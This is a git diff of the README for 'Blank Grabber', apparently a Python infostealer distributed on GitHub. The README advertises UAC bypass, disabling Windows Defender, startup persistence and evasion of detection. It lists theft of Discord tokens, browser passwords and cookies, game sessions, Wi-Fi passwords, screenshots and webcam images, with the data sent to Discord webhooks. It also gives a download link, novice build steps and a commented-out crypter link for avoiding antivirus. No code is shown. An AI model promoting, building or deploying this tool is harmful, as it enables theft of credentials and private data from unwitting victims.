@@ -21,11 +21,11 @@
 ## Table of Contents
 - [Download](#download)
 - [Features](#features)
-- [Builder Config](#builder-config)
+- [Togglable options](#togglable-options)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
 - [To-Do/Enhancements](#to-doenhancements)	<!-- - [Crypter](#crypter)-->
-- [Frequently Asked Questions](#frequently-asked-questions)
+- [Contact me](#contact-me)
 
 ## Download
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
@@ -34,7 +34,6 @@
 
 ## Features
     • GUI Builder.
-    • Lightweight And Small Stub Size.
     • UAC Bypass.
     • Runs On Startup.
     • Disables Windows Defender.
@@ -43,23 +42,23 @@
     • Custom Message Box.
     • EXE Binder.
     • Better Obfuscation.
-    • Anti Unpacking Technique.
+    • Anti Unpacking Technique (Removed due to bugs).
     • Anti UPX-Detection by YARA.
-    • Anti Pyinstaller-Detection by YARA.
+    • Anti Pyinstaller-Detection by YARA (Removed due to bugs).
     • Grabs Discord Tokens.
-    • Grabs Passwords from most browsers.
+    • Grabs Chrome Passwords.
     • Grabs Chrome Cookies.
     • Grabs Minecraft Session.
     • Grabs Roblox Cookies.
     • Grabs IP Information.
     • Grabs System Info.
-    • Grabs Saved Wifi Passwords
+    • Grabs Saved Wifi Passwords.
     • Captures Screenshot.
     • Captures Webcam Image.
     • Sends All Data Through Discord Webhooks.
     (...more)
 
-## Builder Config
+## Togglable Options
 | Option | Description |
 | ------ | ----------- |
 | **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
@@ -74,13 +73,13 @@
 ## Requirements
 **To build the stub, you need:**
 - Windows 10/11 (untested).
-- Python (3.11.0).
+- Python 3.
 - An active internet connection.
 
 ## How to Build?
 *If you literally have no idea how to build it.*
 
-1. Download and install [Python 3.11.0](https://www.python.org/downloads/release/python-3110/) (Make sure to enable the *Add to PATH* option.)
+1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
 3. [Download Blank Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
@@ -94,28 +93,14 @@
 - [x] Icon selector for stub.
 - [x] Message Box.
 - [x] EXE Binder.
-- [ ] Remove some features because they cause bugs.
-- [ ] Discord JS Injection.
-- [ ] Importable Cookies.
+- [x] Remove some features because they cause bugs.
+- [x] Discord JS Injection.
+- [x] Importable Cookies.
 
 <!--## Crypter
    Use Blankrypt to reduce VirusTotal detection.
 
    [![Blankrypt](https://img.shields.io/badge/Crypt-it-green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blankrypt)
 -->
-## Frequently Asked Questions
-- [What is the stub size after building?](#what-is-the-stub-size-after-building)
-- [Can my webhook get leaked?](#can-my-webhook-get-leaked)
-- [How can I contact you?](#how-can-i-contact-you)
-
-#### What is the stub size after building?
-
-The size of the stub depends on your system. For most of the systems, its < 8mb.
-
-#### Can my webhook get leaked?
-
-It is unlikely that your webhook is going to be found.
-
-#### How can I contact you?
-
+## Contact me
 You can contact me via [Discord](https://discordlookup.com/user/904682505104396329) (Only contact me if you need to ask something).
